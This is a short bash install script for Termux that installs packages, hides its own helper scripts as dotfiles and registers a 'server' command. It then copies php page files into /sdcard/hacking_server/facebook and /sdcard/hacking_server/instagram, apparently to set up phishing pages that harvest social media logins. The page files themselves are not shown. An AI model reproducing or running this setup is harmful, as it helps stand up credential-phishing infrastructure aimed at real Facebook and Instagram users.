#!/bin/bash
apt-get update
apt-get upgrade -y
apt-get install figlet -y
apt-get install python2 -y
apt-get install php -y
apt-get install openssh -y
cd $HOME
rm .ser.sh
cd $HOME/server
cp ser.sh $HOME
cd $HOME
mv ser.sh .ser.sh
chmod +x .ser.sh
rm -rf /data/data/com.termux/files/usr/bin/server
ln -s $HOME/.ser.sh /data/data/com.termux/files/usr/bin/server
rm -rf /sdcard/hacking_server
mkdir /sdcard/hacking_server
mkdir /sdcard/hacking_server/facebook
mkdir /sdcard/hacking_server/facebook/php
mkdir /sdcard/hacking_server/instagram
cd $HOME/server
chmod +x facebook.sh
chmod +x serphp.py
cd $HOME/server
cd files/facebook/php
cp -r * /sdcard/hacking_server/facebook/php
cd files/instagram
cp -r * /sdcard/hacking_server/instagram
cd $HOME/server
mv localhost.sh .localhost.sh
mv webhost.sh .webhost.sh
mv facebook.sh .facebook.sh
mv instagram.sh .instagram.sh
echo ""
echo ""
echo "just execute [server]"
